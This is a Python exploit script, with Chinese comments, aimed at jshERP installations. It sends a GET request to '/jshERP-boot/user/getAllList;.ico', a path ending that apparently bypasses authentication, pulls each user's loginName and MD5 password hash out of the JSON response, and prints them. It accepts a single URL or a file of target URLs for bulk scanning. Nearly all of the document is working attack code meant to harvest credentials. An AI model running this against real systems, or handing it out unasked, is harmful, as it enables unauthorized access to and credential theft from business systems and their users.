import argparse
import json

import requests
import urllib3
from jsonpath import jsonpath

parser = argparse.ArgumentParser(description='帮助信息')
parser.add_argument('-u', '--url', help='输入需要验证的URL', default='')
parser.add_argument('-f', '--file', help='输入需要验证的文件', default='')
args = parser.parse_args()
urllib3.disable_warnings()

# 全局请求头，可根据不同的脚进行验证
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}


## 定义check 检查函数，判断返回值是不是包含相同的参数
def check(url):
    url = url.strip('/')
    path = '/jshERP-boot/user/getAllList;.ico'
    check_url = url + path
    try:
        ## 发起get 请求 请求地址check_url
        return_data = requests.get(url=check_url, headers=headers, verify=False)
        ## 对获取到的非标准化json 进行格式化
        data_json = json.loads(return_data.text)
        ## 提取loginName和password
        loginName_data = jsonpath(data_json, '$..loginName')
        password_data = jsonpath(data_json, '$..password')
        ## 将获取到的loginName和password 合并
        user_add_passwd = list(zip(loginName_data, password_data))
        ## 对列表进行转换
        user_passwd = " ".join(str(i) for i in user_add_passwd)

        if 'username' in return_data.text and 'password' in return_data.text and return_data.status_code == 200:
            print(f'[+]{url}  存在泄露用户名和密码泄露  敏感信息：格式： 用户名, md5(密码)：' + user_passwd)
        else:
            print(f'[-]{url}  不存在泄露用户名和密码泄露')
    except Exception as e:
        print("出现异常，请手工利用")


# ## 定义more 函数用于读取文件
def more(file):
    f = open(file, 'r')
    ##readline() 函数用于读取文件中的一行，包含最后的换行符“\n”
    for i in f.readlines():
        ##strip() 方法用于移除字符串头尾指定的字符（默认为空格或换行符）或字符序列。 「该方法只能删除开头或是结尾的字符，不能删除中间部分的字符。」
        i = i.strip()
        check(i)


if __name__ == '__main__':
    ## 输入的内容是是否为空
    if args.url != '' and args.file == '':
        ## 执行函数
        check(args.url)
    if args.url == '' and args.file != '':
        more(args.file)
